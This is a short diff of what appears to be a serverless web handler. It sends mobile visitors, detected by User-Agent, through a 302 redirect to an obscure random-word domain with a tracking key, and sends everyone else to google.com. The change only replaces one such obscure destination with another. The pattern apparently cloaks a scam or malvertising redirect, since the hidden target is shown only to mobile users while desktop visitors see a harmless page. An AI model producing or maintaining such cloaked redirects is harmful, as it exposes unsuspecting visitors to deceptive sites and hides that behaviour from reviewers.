@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://nobleduringsurveillance.com/fws83td5q9?key=2ad5d7e195fcbec625d5f0e3e5a73a63", 302);
+    return Response.redirect("https://encumbercomplication.com/jstr1j45k?key=c17fe28d4b634b684d3d37a167ba6e5d", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
